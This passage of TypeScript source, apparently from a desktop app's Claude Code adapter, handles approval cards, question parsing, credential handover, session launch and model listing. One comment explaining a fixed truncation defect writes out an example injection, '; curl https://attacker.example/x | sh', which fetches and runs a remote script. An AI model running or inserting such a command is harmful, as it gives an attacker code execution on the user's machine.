  return typeof plan === 'string' ? plan.trim() : ''
}

/**
 * What the card ASKING the user actually says (056).
 *
 * The SDK sends no `title` for any of the three user-input tools — measured, not assumed: our
 * ledger's cards carry the bare tool name in the field that renders as the question
 * (`user_input_request.prompt: "ExitPlanMode"`, `sess_423479cd…` ord 89). So the fallback is not a
 * rare path, it is the ONLY path, and "ExitPlanMode" is not a sentence anybody asked.
 *
 * The plan case is the one that matters. 030 exists because a card asking you to approve a plan you
 * were never shown is worse than no card; a plan whose document did not arrive is that same
 * situation, and the only honest thing to do is name it. So the wording splits on whether there IS
 * a document — never a hopeful one that reads the same either way.
 */
function userInputPrompt(toolName: string, title: string | undefined, hasPlan: boolean): string {
  if (title !== undefined && title !== '') return title
  switch (toolName) {
    case 'ExitPlanMode':
      return hasPlan
        ? 'The agent has finished planning and asks you to approve its plan.'
        : 'The agent asks you to approve its plan — but did not send the plan itself.'
    // ⚑ No `EnterPlanMode` case since `736` (R98): it never reaches a card — see
    // {@link CONSENT_ONLY_USER_INPUT}.
    default:
      return toolName
  }
}

/** Neutral questions from an `AskUserQuestion` input; `[]` for a non-question tool (e.g. ExitPlanMode). */
function claudeQuestions(toolName: string, input: Record<string, unknown>): UserInputQuestion[] {
  if (toolName !== 'AskUserQuestion' || !Array.isArray(input['questions'])) return []
  return input['questions'].map((q, i) => ({
    id: `q${i}`,
    prompt: isRecord(q) && typeof q['question'] === 'string' ? q['question'] : `question ${i + 1}`,
    // ⚑ **The compact label the tool was designed around** (143). `header` is REQUIRED on every
    // question in the pinned `AskUserQuestionInput` — *"Very short label displayed as a chip/tag
    // (max 12 chars)"* — and it was read off none of them. Copied when it is a string and omitted
    // when it is not; a question with no header shows none rather than a placeholder (086).
    header: (isRecord(q) && typeof q['header'] === 'string' ? q['header'] : '') || undefined,
    // ⚑ **`description` is carried, and 142's measurement is the reason the card has room for it**
    // (143). Reassembled from the `input_json_delta` frames of `sess_71a5b654` — ordinals
    // **220–231**, twelve chunks, 1,744 characters of valid JSON; ord 232 is the summarized
    // `tool_call`, whose `summary` is bounded at 200 chars and truncated mid-option, which is why
    // the raw chunks are the only thing that can answer this. Every option the model sent was
    // `{label, description}`: a 1-to-5-word label and a description measured at **105, 119, 123,
    // 145, 165, 165 and 177 characters** — range 105–177, mean 142.7, with the low end reaching 101
    // across the other four reconstructable calls in that session.
    //
    // ⚠️ **That range is why the chip could not simply grow one.** A 28px pill has no room for a
    // paragraph, which is what 139 and 108 both refused this on — so the control changes shape
    // instead: options with descriptions render as full-width rows, options without stay pills. The
    // measurement decided the layout rather than the layout deciding what to carry.
    //
    // ⛔ **`preview` is still NOT carried, and its absence is now the only one.** 142 found three
    // previews of 266/251/315 characters in `sess_865688c3`'s lossless `raw_frame` archive, so it is
    // real; it is also a panel rather than a line, and this dispatch was scoped to `description`.
    options:
      isRecord(q) && Array.isArray(q['options'])
        ? q['options'].map((o) =>
            isRecord(o) && typeof o['label'] === 'string'
              ? {
                  label: o['label'],
                  // ⛔ **An EMPTY description is dropped, not carried** (143, 086). Both providers
                  // declare the field required, so a producer sending `''` is sending a reason that
                  // says nothing — and "no reason" must have ONE representation in the ledger, or
                  // absent and empty become two states the card has to be taught to read alike.
                  ...(typeof o['description'] === 'string' && o['description'] !== ''
                    ? { description: o['description'] }
                    : {}),
                }
              : { label: String(o) },
          )
        : [],
    // ⛔ **Unconditional on this provider, because the SDK makes it unconditional** (143). Claude's
    // own instruction to the model is *"There should be no 'Other' option, that will be provided
    // automatically"* — so there is no per-question field to copy and the escape exists for every
    // question that offers a list. A question with NO options is already free-form and does not need
    // the flag to say so, which is why this is `> 0` rather than `true`: the flag means "labels are
    // not the only answer", and on an empty list there are no labels for it to be true of.
    allowOther: (isRecord(q) && Array.isArray(q['options']) ? q['options'].length : 0) > 0,
    // Carry `multiSelect` from `AskUserQuestionInput` only when it is exactly `true`. An absent or non-boolean flag does not establish that several answers are allowed.
    multiSelect: isRecord(q) && q['multiSelect'] === true,
  }))
}

/**
 * The same job as {@link userInputPrompt}, for the other card. This one fills a
 * `permission_request.detail` from the tool's own arguments; that one fills a
 * `user_input_request.prompt` with a sentence. They are separate because the two cards ask
 * different things — but they are the only two places a tool's name can leak to the user as if it
 * were English, so a change to one is usually a question about the other.
 */
function summarizeForDetail(toolName: string, input: Record<string, unknown>): string {
  const command = input['command']
  // ⚠️ **`.slice(0, 200)` used to be here, and it was the defect** (071, from 069 finding 1). The
  // remainder went nowhere: not onto the event, not into the scope, not into the transcript — the
  // `tool_call` row only appears once the tool RUNS, i.e. after Allow. So at decision time the card
  // was the only thing there was, and it showed the first 200 characters of what Allow authorized
  // with no ellipsis and no way to see the rest. A benign prefix padded to the boundary and
  // `; curl https://attacker.example/x | sh` after it is the whole exploit.
  //
  // The bound that replaced it lives on the event ({@link boundPermissionDetail}), is ~330× longer
  // than anything ever recorded here, and — the part that matters — reports itself when it bites.
  if (typeof command === 'string') return command
  const filePath = input['file_path']
  if (typeof filePath === 'string') return filePath
  return toolName
}

/**
 * The Claude adapter: builds one SDK `Query` per session with a prompting
 * permission profile (`permissionMode: 'default'`, `canUseTool`) and streaming
 * deltas (`includePartialMessages: true`), per the 001 non-negotiables.
 */
export class ClaudeRuntime implements AgentRuntime {
  readonly provider = 'claude' as const
  private readonly queryFactory: QueryFactory
  private readonly sessionExists: SessionExists
  private readonly authTokenProvider: ClaudeAuthTokenProvider | undefined
  private readonly authTokenProviderAsync: ClaudeAuthTokenProviderAsync | undefined
  /** The login a launch runs on, read without blocking the thread; see the constructor. */
  private readonly launchTokenProvider: ClaudeAuthTokenProviderAsync | undefined
  /** How a CLI child is started (233) — the real `spawn` by default; a stand-in in tests. */
  private readonly spawnChild: SpawnChild
  private readonly apiKeyProvider: ClaudeApiKeyProviderAsync | undefined
  /**
   * 🔒 **The API key each launch's options were built with, kept OFF those options** — where the
   * key travels by descriptor ({@link handOverApiKey}). `Options.env` is the child's environment,
   * and a key there is the route the descriptor exists to avoid; so {@link optionsFor} and
   * {@link listOptionsFor} file the key here against the object they return, and
   * {@link spawnWitness} hands it to that launch's spawn. Weak, so a launch's key goes with it.
   */
  private readonly launchKeys = new WeakMap<Options, string>()
  /** Whose way of handing the CLI an API key applies ({@link handOverApiKey}); a seam for tests. */
  private readonly platform: NodeJS.Platform
  /**
   * The absolute path of the Claude Code every launch runs, as the app found it
   * (`apps/desktop/src/main/runtime/claude-program.ts`). Absent, the SDK finds its own copy where
   * it carries one (a development checkout, a test, a probe).
   */
  private readonly program: string | undefined

  /**
   * `apiKeyProvider` yields the Anthropic API key a person entered in the app, or null when none is
   * set. When it yields one, every launch runs on that key, handed over the way `platform` allows —
   * a descriptor, or on Windows the environment with the CLI told to keep it from what it runs (see
   * {@link handOverApiKey}) — and the login below is not read.
   *
   * `authTokenProvider` (022) is the host-wired machine-login bridge, used when no API key is set:
   * its token is injected transiently as `CLAUDE_CODE_OAUTH_TOKEN` (via `buildChildEnv`)
   * and a null return fails the launch closed (never a global fallback). When unset
   * (the library default), no auth is injected — the app must wire it for real logins.
   *
   * ⚠️ **`authTokenProviderAsync` is the SAME credential read for a different caller** (149): the
   * launch above has no await to put it in — it is building a spawn env — while the turn gate runs
   * on Electron's main process and must not block it (148 H4). Both parse one blob through one
   * function; only the way they wait differs. A runtime given the first and not the second launches
   * normally and never notices a sign-in move, which is what every library-default and test
   * construction wants.
   *
   * `launchTokenProvider`, when given, is what a launch reads the login with instead of
   * `authTokenProvider`: the same read without blocking the thread, which matters when many
   * conversations start at once on Electron's main process. It answers `null` for no login and
   * throws when the machine ran short, as the blocking read does.
   */
  constructor(
    queryFactory: QueryFactory = query,
    sessionExists: SessionExists = defaultSessionExists,
    authTokenProvider?: ClaudeAuthTokenProvider,
    authTokenProviderAsync?: ClaudeAuthTokenProviderAsync,
    spawnChild: SpawnChild = spawnClaudeChild,
    apiKeyProvider?: ClaudeApiKeyProviderAsync,
    platform: NodeJS.Platform = process.platform,
    /**
     * ⚑ What a launch with nothing to run on says — {@link whyNoClaudeLogin}, for this platform, read
     * at the moment it is said. A test hands its own, so nothing reads a real home.
     */
    whyNoLogin: () => string = () => whyNoClaudeLogin({ platform }),
    program?: string,
    launchTokenProvider?: ClaudeAuthTokenProviderAsync,
    private readonly managedProviderHomesRoot?: string,
  ) {
    this.queryFactory = queryFactory
    this.sessionExists = sessionExists
    this.authTokenProvider = authTokenProvider
    this.authTokenProviderAsync = authTokenProviderAsync
    this.spawnChild = spawnChild
    this.apiKeyProvider = apiKeyProvider
    this.platform = platform
    this.whyNoLogin = whyNoLogin
    this.program = program
    this.launchTokenProvider = launchTokenProvider
  }

  /**
   * Read the launch's key once, without blocking, and only read the login when no key is saved.
   */
  private async authForALaunch(): Promise<{ key: string | null; login?: string | null }> {
    const key = (await this.apiKeyProvider?.()) ?? null
    if (key !== null && key !== '') return { key }
    return { key: null, login: await this.launchTokenProvider?.() }
  }

  /** ⚑ What a launch with nothing to run on says — see the constructor. */
  private readonly whyNoLogin: () => string

  /**
   * 🔴 **716 · R66 — the SDK's `query()`, with its missing program said as a TYPE.** Every launch
   * this adapter makes — a start, a resume, the model probe — calls the SDK through here.
   *
   * ⛔ **The SDK throws its missing program synchronously, from inside `query()`, before any spawn**
   * (measured in `claude-binary.test.ts`): a plain `Error` with no code, which a
   * caller could only have classified by its text. ⚑ So a throw here is asked one question — is the
   * program where the SDK looks? — and becomes {@link ClaudeUnavailableError} only when it is not
   * ({@link aProgramTheSdkCouldNotFind}). ⚠️ Anything else the SDK throws goes on as it came, and a
   * `query()` that returns is never asked anything.
   *
   * The program this runtime was given is set here, on every launch (a start, a resume, the model
   * probe), so all three run the same Claude Code. Given one, the SDK looks nowhere itself, so a
   * throw is asked instead whether that program could not be started at all
   * ({@link aProgramThatCouldNotRun}).
   */
  private queryOrWhyNot(params: Parameters<QueryFactory>[0]): ClaudeQuery {
    const program = this.program
    if (program !== undefined) params.options.pathToClaudeCodeExecutable = program
    try {
      return this.queryFactory(params)
    } catch (error) {
      throw program === undefined
        ? aProgramTheSdkCouldNotFind(error)
        : aProgramThatCouldNotRun(program, error)
    }
  }

  /**
   * A fresh {@link ClaudeChildWitness} for one launch (233).
   *
   * ⚠️ **One per launch, never shared and never reused.** A witness watches exactly one child, and
   * `exited` is that child's exit; a second launch handed the first launch's witness would report a
   * dead process as the live one's receipt, which is 229 H1's defect with the promise pointing at
   * the wrong process instead of at a timer.
   *
   * The spawn itself is injected ({@link SpawnChild}) so a test can drive the real adapter with a
   * child that never exits — the shape the SDK actually produces and the one no test could express
   * before, because until now there was no seam between this adapter and `child_process.spawn`.
   *
   * `options` are the ones this launch's query is built from: an API key filed against them (see
   * {@link launchKeys}) goes to this spawn's descriptor.
   */
  private spawnWitness(options: Options): ClaudeChildWitness {
    return watchClaudeChild(this.spawnChild, this.launchKeys.get(options))
  }

  async start(opts: StartOptions): Promise<SessionHandle> {
    // A cancel that landed BEFORE the launch: the host aborts every launch in flight when the app
    // quits, and a start admitted after that would spawn a CLI into a host that has already swept
    // its map (070). Nothing is created above this line. ⚠️ **707 · and there is one interval now**
    // — the spawn check below, after the query exists — which is asked again after it.
    assertNotCancelled(opts.signal, 'claude start')
    const input = new AsyncQueue<SDKUserMessage>()
    // ⚠️ **Narrowed ONCE, here, and fed to both the handle and the Options** (076, corrected in
    // review). `ReasoningEffort` is an open string now, so a launch context can legitimately carry
    // `ultra` — Codex's vocabulary, from a persisted row or a profile reused across providers — and
    // `optionsFor` correctly omits it, leaving Claude on its own default. The first version still
    // seeded the HANDLE with the raw value, so `settings.reasoningEffort.effective` read `ultra`
    // for a session running on Claude's default: the header would have stated, in so many words, an
    // effort the provider had never been asked for. Deriving it once means what we report and what
    // we send cannot disagree — the same rule the Codex `send()` follows for the same reason.
    const effort = claudeEffort(resolveReasoningEffort(opts) ?? '') ?? undefined
    // The launch values seed the three next-turn settings (076), so `settings.*.effective` opens
    // saying what this session was actually started with rather than "nobody chose".
    const handle = new ClaudeSessionHandle(
      input,
      opts.cwd,
      0,
      undefined,
      opts.approvalMode,
      effort,
      opts.model,
      opts.planMode,
      // 147: the same machine login `childEnvAdditions` injects from, read the non-blocking way
      // (149), so this session can later ask whether the sign-in it launched with is still the
      // machine's without freezing the process that asks.
      this.authTokenProviderAsync,
      // 🔴 W4.189: the work folders, which `optionsFor` puts in the flag settings from the handle.
      opts.workFolders,
    )
    handle.noteAlwaysRulesFile()
    const auth = await this.authForALaunch()
    assertNotCancelled(opts.signal, 'claude start')
    // ⚑ Read without holding the thread: the repository gate asks git.
    const kept = await keptRulesForALaunch(
      opts.providerHome,
      handle.launchLocalFiles(),
      opts.signal,
    )
    assertNotCancelled(opts.signal, 'claude start')
    const options = this.optionsFor(
      handle,
      confinementFor(opts.cwd, opts),
      opts.model,
      opts.systemHint,
      effort,
      opts.planMode,
      // 347: the toolset rides the launch context, so start and resume read the same field.
      opts.agentTools,
      // ⚑ **516 · the registry grants, on the same launch context and for the same reason** — see
      // {@link ProviderRuntimeContext.externalMcp}.
      opts.externalMcp,
      auth,
      kept,
      opts.builtInSkills,
      opts.sharedSkillsRoot,
      opts.managedPluginMcp,
    )
    handle.noteBuiltInSkills(opts.builtInSkills)
    handle.noteSharedSkills(opts.sharedSkillsRoot)
    // **`ultracode`, and it is set HERE rather than inside `optionsFor` on purpose** (106).
    //
    // ⚠️ `optionsFor` is shared with `resume`, which spreads its result — so a line added there
    // would silently re-ask for a session-scoped mode on every reopen, which is exactly what
    // {@link StartOptions.ultracode} says must not happen. `start` is the only caller that may know
    // about it, and `ResumeOptions` cannot even express it.
    //
    // `Options.settings` (`sdk.d.ts:2148`) is the flag-settings layer — the same layer
    // `applyFlagSettings` merges into mid-session, and the SDK's own suggested route for this
    // setting (*"typically provided via `--settings`"*).
    //
    // ⛔ **A MERGE since 166, and 106's comment here called its own shot**: *"Nothing else in this
    // adapter sets it, so the object is built rather than merged; if a second flag setting ever
    // arrives, this becomes a merge and the test that pins it should fail first."* 166 is that
    // second flag setting — `autoMemoryDirectory`, written in `optionsFor` — and an assignment here
    // would have silently deleted it for every ultracode session, moving that session's memory back
    // to the per-cwd default. The test that pinned `settings` did fail first.
    //
    // Written only when asked. `settings: {ultracode: false}` is a thing we would be SAYING, and we
    // have nothing to say when the user did not ask.
    //
    // 🔴 **W4.189 · merged onto the object `optionsFor` built, never onto a second build** — a second
    // read of the kept rules could differ from the read the handle holds, and every work-folder
    // change re-sends THAT one ({@link ClaudeSessionHandle.keptRules}).
    if (opts.ultracode === true) {
      options.settings = { ...options.settings, ultracode: true }
      handle.askedForUltracode()
    }
    // ⛔ **The termination receipt begins here** (233, from 229 H1). The witness owns the CLI child
    // by supplying the spawn the SDK would otherwise do privately, which is the only way anything in
    // this process gets a fact about that child rather than a deadline about it. See
    // {@link ClaudeChildWitness} for why the SDK exposes no pid and why this is the sanctioned door.
    //
    // ⚠️ **Written onto `options` here rather than in `optionsFor`, and unlike `ultracode` the
    // reason is not that resume must not have it** — resume MUST have it, and does, one witness per
    // launch. It is here because `optionsFor` is a pure builder shared by both paths and by the
    // model probe, and a witness is a live object bound to exactly one query: minting one inside a
    // shared builder would hand `resume`'s spread a witness watching `start`'s child.
    const child = this.spawnWitness(options)
    options.spawnClaudeCodeProcess = child.spawn
    // 🔴 **722 · R79 — the conversation is named BEFORE the CLI runs.** `Options.sessionId` becomes
    // `--session-id=<uuid>`, and the bundled CLI checks it is a UUID, refuses one
    // whose `<id>.jsonl` is already on disk (*"Session ID … is already in use"*) and names its
    // transcript by it — measured on 2.1.281 by `pnpm run probe:claude-launch-id` (`722`).
    // ⛔ **Here and never in `optionsFor`**, for `ultracode`'s reason above: `resume` spreads that
    // builder, and the CLI refuses the flag beside `--resume` (*"--session-id can only be used with
    // --continue or --resume if --fork-session is also specified"*) — a line there would end every
    // reopen. The model probe sends no turn and is given none.
    // ⛔ Only the id is held: the ref's cwd is read off the transcript at the close
    // ({@link launchTranscriptCwd}) — the CLI records the folder it resolved, and a `/tmp` or
    // symlinked `opts.cwd` is not that spelling (the `722` review).
    const launchedAs = randomUUID()
    options.sessionId = launchedAs
    handle.holdLaunchRef(launchedAs, async () =>
      launchTranscriptCwd(launchedAs, opts.cwd, opts.providerHome),
    )
    let query: ClaudeQuery | null = null
    try {
      query = this.queryOrWhyNot({ prompt: input, options })
      // 🔴 **707 · R39, extended — resume's check (`705`), on a start.** ⛔ A spawn that failed AFTER
      // its pipes were made (`EAGAIN`, `EACCES`, `ENOENT`) throws nothing out of `query()`, and this
      // start used to hand the handle back: `spawn_agent` said `ok` about a conversation whose CLI
      // never ran. ⚑ The witness has heard by one macrotask ({@link ClaudeChildWitness.spawnFailure}).
      const refusedAfterItsPipes = await child.spawnFailure()
      if (refusedAfterItsPipes !== null) throw refusedAfterItsPipes
      // ⛔ …and a cancel that landed during that macrotask is honoured here: the query exists, so the
      // catch below is the one thing that closes its CLI (resume's round-two finding, `705`).
      assertNotCancelled(opts.signal, 'claude start')
    } catch (error) {
      if (query !== null) {
        try {
          query.close()
        } catch {
          // best-effort detach
        }
      }
      input.close()
      // 🔴 **707 · the spawn's own errno, when the spawn is what failed** — resume's normalisation
      // (`705`) without the `ResumeError`: a start has no ref to name, so it throws the errno ITSELF.
      // ⛔ A descriptor shortage leaves the child with no `stdin`, and the SDK's `stdin.on(…)` throws
      // a `TypeError` INSIDE `query()`, so `error` named the SDK's line and not the machine's
      // shortage. ⚑ The `TypeError` it provoked is dropped, because it says nothing the errno does
      // not; anything else is rethrown as it came.
      const spawnFailure = await child.spawnFailure()
      if (spawnFailure === null) throw error
      throw spawnFailure
    }
    handle.attachQuery(query, child)
    handle.begin('started')
    return handle
  }

  /**
   * The models this login may run (058) — `Query.supportedModels()`, measured live at 0.3.218: **1.4
   * s, 4 rows, no turn started, no tokens spent.**
   *
   * ⚠️ **The prompt that never yields is the whole mechanism, not a trick.** `supportedModels` is a
   * method on the QUERY object, not a free function, so there has to be a query — and a query whose
   * prompt is an async iterable that never produces a message initializes the CLI (which answers
   * control requests) without ever starting a turn. Handing it a real message here would send one,
   * and the cost of asking what models exist would be a conversation.
   *
   * ```
   * → supportedModels()
   * ← [{value:'default', resolvedModel:'claude-opus-4-8[1m]', displayName:'Default (recommended)'},
   *    {value:'opus[1m]', …}, {value:'sonnet', …}, {value:'haiku', …}]
   * ```
   *
   * Alias resolution depends on the account and server, not only the SDK pin, and can change without a client update. A model entered manually or set as an agent default can therefore differ from the current provider menu and be rejected by the Claude Code program being run.
   *
   * `value` is the id and `resolvedModel` is what it points at — and `value` is what we send, per
   * `ModelInfo.resolvedModel`'s own doc: it exists so a host *"can match a persisted explicit id
   * against the alias row that covers it"*, which makes `value` the thing to persist and the
   * resolution the thing to display against it.
   *
   * ⚑ **`[1m]` is the PROVIDER's suffix, not a display annotation of ours** (164 §3.2 — reported as
   * a defect, measured as a non-defect). A live tester read *"The exact model ID is
   * `claude-opus-5[1m]`"* in the session's own environment block and called the bracket a host
   * annotation leaking into an id field. It is neither ours nor an annotation: that sentence is the
   * CLI's `env_info` section, and the pinned CLI's own catalogue is full of the form —
   * `sonnet[1m]`, `fable[1m]`, `claude-opus-4-7[1m]`, `claude-sonnet-4-5-20250929[1m]`. It denotes
   * the 1M-context variant and the CLI accepts it as a model value. This adapter composes no id at
   * all: it copies `value` through, persists it, and sends it back verbatim. ⚠️ **Nothing downstream
   * parses one either** — no split, no prefix test, no version extraction anywhere in the app — so
   * there is no field for the bracket to break. Recorded rather than patched, per the ticket's own
   * rule for findings that turn out to belong to the SDK.
   *
   * ⚠️ **There is a row whose `value` is literally `'default'`, and it is not our "nobody chose".**
   * Picking it persists the string `default` and asks the provider for its default BY NAME, which
   * is a real choice a user can make and a resume can honour. Leaving the field blank persists
   * `null` and asks for nothing at all. 038 drew that line and the menu must not blur it — which is
   * why nothing is pre-selected and the blank stays reachable above the list.
   *
   * No `hidden` and no `upgrade` here: those are the other provider's fields (058 checked). Claude's
   * `ModelInfo` has neither, so there is nothing to filter and nothing to pass through as a note.
   */
  async listModels(context: ProviderRuntimeContext): Promise<ModelChoice[]> {
    assertNotCancelled(context.signal, 'claude model list') // a probe is a launch (070)
    const auth = await this.authForALaunch()
    assertNotCancelled(context.signal, 'claude model list')
    // ⚑ `740` · `null`: a model list runs in no project, so no project's kept rules are read.
    const kept = await keptRulesForALaunch(context.providerHome, null, context.signal)
    const options = this.listOptionsFor(context.providerHome, kept, auth)
    // 🔴 **The probe spawns its own CLI, and until 261 it was the one launch that did NOT go
    // through this app's spawn** (261 §1, from 259 lens D finding 1). The SDK resolves the same
    // `app.asar/…/claude` spelling here as it does for `start` and `resume`, so in the packaged app
    // the model menu failed with `ENOTDIR` for exactly the same reason a conversation did — and a
    // fix applied only to the two session paths would have left the third quietly broken.
    //
    // ⚑ **This adapter's own comment on `start` named the three and stopped at two**: *"a pure
    // builder shared by both paths and by the model probe"*. The probe was already in the sentence.
    //
    // ⚠️ **It costs the SDK's stderr suffix, exactly as 233 paid it for the session paths.** The
    // SDK appends `formatStderrTail()` to the error it builds for a child it spawned itself, and
    // owning the spawn empties that tail; {@link watchClaudeChild} logs it on any non-zero exit
    // instead, which is where 085 says a provider's raw text belongs. ⚑ A witness per launch, never
    // shared — a probe is a launch (070), and this one is its own.
    options.spawnClaudeCodeProcess = this.spawnWitness(options).spawn
    const probe = this.queryOrWhyNot({ prompt: neverSends(), options })
    // ⚠️ **This one has a real interval and 068 measured it: up to 15 seconds** — the probe's own
    // deadline — during which a CLI child exists and only the `finally` below would close it. A quit
    // in that window used to terminate Electron first, leaving an authenticated child behind; repeat
    // launches accumulated them. The cancel is what reaches the child instead of the awaiter.
    // ⚠️ Closed at most once. Codex's `transport.close()` memoizes its own teardown, so the cancel
    // path and the `finally` below cannot collide there; `ClaudeQuery.close()` promises nothing of
    // the kind, and calling a detach twice on a transport that is already gone is not something this
    // adapter should be finding out about during a shutdown.
    //
    // ⛔ **And it now RETURNS the teardown rather than firing it** (202, from 191 H3). The probe is
    // the launch `068` finding 7 was about — a real CLI child, up to fifteen seconds, owned by
    // nothing else — and `probe.close()` handed back `void`, so both the cancel path and the
    // `finally` below declared it over while the child was still exiting. The memoized promise is
    // what the `finally` awaits; the cancel path still cannot await anything, which is `cancelWith`'s
    // shape and is why the `finally` is the one that has to.
    let closing: Promise<void> | null = null
    const closeProbe = (): Promise<void> => {
      if (closing === null) {
        probe.close()
        closing = probe.return
          ? withTimeout(Promise.resolve(probe.return()), CLOSE_EXIT_RECEIPT_TIMEOUT_MS)
          : Promise.resolve()
      }
      return closing
    }
    const cancel = cancelWith(context.signal, closeProbe)
    try {
      if (!probe.supportedModels) {
        throw new Error('the pinned SDK query exposes no supportedModels()')
      }
      // ⚠️ **BOUNDED, and the bound is what makes the `finally` reachable at all** (058 review).
      // A naked `await` here is only safe if the CLI always answers. A subprocess that is ALIVE but
      // silent — rate-limited, stalled IPC — never rejects and never resolves, so the `finally`
      // below is never reached, the child lives as long as the app, and `listModels` never settles.
      // A promise that never settles is worse than one that fails: the host caches this probe, so
      // one stuck child would leave every future caller awaiting it forever, with no error, no log
      // and no menu. The deadline converts that into an ordinary rejection the host already knows
      // how to turn into "no menu for this provider".
      const models = await withDeadline(probe.supportedModels(), MODEL_PROBE_TIMEOUT_MS, 'claude')
      if (cancel.cancelled) throw new Error('claude model list was cancelled')
      return models.map((model) => ({
        id: model.value,
        label: model.displayName || model.value,
        ...(model.description ? { description: model.description } : {}),
        // ⚑ **D-042 · what an alias points at** (*opus → claude-opus-5-5*), from the SDK's own
        // `resolvedModel` — the field this comment's header quotes as made for matching a persisted
        // id against its alias row. Absent when it is the id itself.
        ...(model.resolvedModel && model.resolvedModel !== model.value
          ? { resolvesTo: model.resolvedModel }
          : {}),
        // ⚑ **D-042 · R1 — Claude's default, by name**: the CLI's own `default` row.
        ...(model.value === CLAUDE_DEFAULT_BY_NAME.model ? { isDefault: true as const } : {}),
        // ⚠️ **The provider's own per-model answer, which 106 found we were throwing away.**
        //
        // This mapped all five of {@link CLAUDE_EFFORTS} onto every row until 106, explaining itself
        // with *"`ModelInfo` carries nothing per-model to narrow it with"*. That was false at the
        // pinned 0.3.218 and had been: `ModelInfo` declares `supportsEffort?: boolean`
        // (`sdk.d.ts:1225` there, `:1347` at 0.3.281) and `supportedEffortLevels?: (…)[]` (`:1229`,
        // `:1351`).
        //
        // ⚠️ **And a declared field is not a sent field, so it was measured rather than assumed**
        // (`smoke/model-effort-probe.smoke.ts`, real login, no turn, no tokens). The CLI sends it,
        // and it does NOT send the same answer for every model:
        //
        // ```
        // default → claude-sonnet-5  supportsEffort:true  [low,medium,high,xhigh,max]
        // sonnet  → claude-sonnet-5  supportsEffort:true  [low,medium,high,xhigh,max]
        // opus    → claude-opus-4-8  supportsEffort:true  [low,medium,high,xhigh,max]
        // haiku   → claude-haiku-4-5   (neither field)
        // ```
        //
        // ⚑ **Re-taken at 0.3.281 (680): the same shape** — `opus` → `claude-opus-5-5` and a new
        // `claude-fable-5-1` row both carry all five levels, and `haiku` still carries neither field.
        //
        // So `efforts` is now the row's own list, and a row the provider left blank gets **no
        // field** — which {@link ModelChoice.efforts} already documents as *"the provider did not
        // say"*, a sentence that was not true of this adapter until now. The narrowing is what the
        // effort menu reads (`effort-menu.ts`); it was also what `NewConversation.vue`'s
        // `ultracodeBlocker` read to answer "does the model the user named report `xhigh`" (106) —
        // a gate that went with the control, and a precondition 0.3.287 dropped. Not
        // `ProviderCapabilities.ultracode`, which an earlier draft of this comment named: that table
        // is a static, provider-wide declaration and this question is per-model.
        //
        // ⚠️ **`supportsEffort` is deliberately NOT consulted.** It answers "does this model take
        // effort at all", and every consumer downstream needs a NAMED level — a `true` with no list
        // narrows nothing. Reading it would mean inventing a list to go with it.
        //
        // ⚠️ Absence is informative HERE only because it is differential — three rows carry the
        // field and one does not, in one response. It is not read as "haiku cannot"; it is read as
        // "haiku was not described", which is why the surface says that and not the other thing.
        //
        // 076's finding stands and this does not undo it: `xhigh` and `max` were real the whole time
        // and 024's neutral union hid them. They are still here — on every row the provider named
        // them on, which is the part that was being guessed.
        ...(model.supportedEffortLevels && model.supportedEffortLevels.length > 0
          ? { efforts: model.supportedEffortLevels.map((level) => ({ id: level, label: level })) }
          : {}),
        // Publish `CLAUDE_DEFAULT_BY_NAME`'s medium effort only on rows that offer it. This is BroBot's fallback, not a default reported by the provider catalogue; see `default-by-name.ts`. A row with no efforts gets none.
        ...(model.supportedEffortLevels?.includes(CLAUDE_DEFAULT_BY_NAME.effort)
          ? { defaultEffort: CLAUDE_DEFAULT_BY_NAME.effort }
          : {}),
      }))
    } finally {
      cancel.release()
      // Always, and swallowing its own failure: this is a probe, and a probe that leaves a CLI
      // running because it could not close it cleanly is worse than one that reports a stale error.
      // ⚠️ `withDeadline` releases the AWAITER, not the child — this is the line that releases the
      // child, and it is the reason the deadline is not enough on its own.
      // ⛔ **Awaited since 202** (191 H3): releasing the child and the child being gone were two
      // different moments, and only the first of them was ever waited for.
      try {
        await closeProbe()
      } catch {
        /* best-effort: there is nothing further this can do about a CLI that will not close */
      }
    }
  }

  /**
   * Options for the model probe: the same isolated home and sanitized env a real session gets, and
   * nothing else.
   *
   * The home matters — a model list is *what this login may run*, so asking from anywhere but the
   * profile's own home would answer about a different account. `childEnvAdditions` is shared with
   * `optionsFor` for that reason, and it is also what makes the probe fail closed when the Keychain
   * bridge has no token, exactly as a launch would.
   */
  private listOptionsFor(
    providerHome: string,
    kept: KeptRuleLists,
    auth?: { key: string | null; login?: string | null },
  ): Options {
    const { additions, piped } = this.childEnvAdditions(providerHome, auth)
    const options: Options = {
      env: buildChildEnv(additions),
      strictMcpConfig: true,
      // Nothing may run: no turn is ever started, but a probe that COULD execute a tool if one
      // somehow began is a broader thing than it needs to be.
      settingSources: [],
      // ⚠️ **The same memory directory a real session gets** (166), for the same reason the home is
      // the same one: a probe that pointed somewhere else would be a second answer to "where does
      // this profile remember things", and the CLI resolves the directory at startup whether or not
      // a turn follows. It cannot write there — no turn is ever started — so this is about there
      // being ONE derivation, not about the probe needing a memory.
      settings: {
        ...flagSettingsFor(providerHome, kept),
        ...managedTranscriptSettings(providerHome, this.managedProviderHomesRoot),
      },
    }
    if (piped !== null) this.launchKeys.set(options, piped)
    return options
  }

  async resume(ref: SessionRef, options: ResumeOptions): Promise<SessionHandle> {
    if (ref.provider !== 'claude') {
      throw new ResumeError(ref, `wrong provider: expected claude, got ${ref.provider}`)
    }
    // One consistent resume error boundary (030, fixing 023 P1-D): EVERY preflight /
    // eager-setup failure — a `sessionExists` probe that throws, an `optionsFor` /
    // query-factory error, any resource construction error — is normalized to a
    // `ResumeError` (cause preserved), never a generic `Error`, and partial resources
    // are closed before rejecting. The line is crisp: only the SETUP phase (before
    // this returns a handle) is wrapped here — the deliberate 011 two-stage
    // *post-handle* first-turn identity mismatch stays a fatal stream error, because a
    // handle was already returned. The typed `AuthUnavailableError` (022) passes
    // through unchanged — auth-unavailable is an explicit auth state, not a resume
    // failure (mirrors the Codex adapter's pre-handshake auth check).
    let input: AsyncQueue<SDKUserMessage> | null = null
    let query: ClaudeQuery | null = null
    // ⚑ **705 · outside the try, so the catch can ask it** — see the catch.
    let child: ClaudeChildWitness | null = null
    try {
      assertNotCancelled(options.signal, 'claude resume') // nothing built yet (070)
      // Honest resume: validate the session exists in the SAME profile home BEFORE
      // building a query, so a missing session (or one under a different home) throws
      // rather than silently starting fresh (001 decision 5; home-scoped per 021).
      if (!(await this.sessionExists(ref.sessionId, ref.cwd, options.providerHome))) {
        // ⚑ **706 · the one arm of this adapter that is a NEVER, and it says so** — the host lets
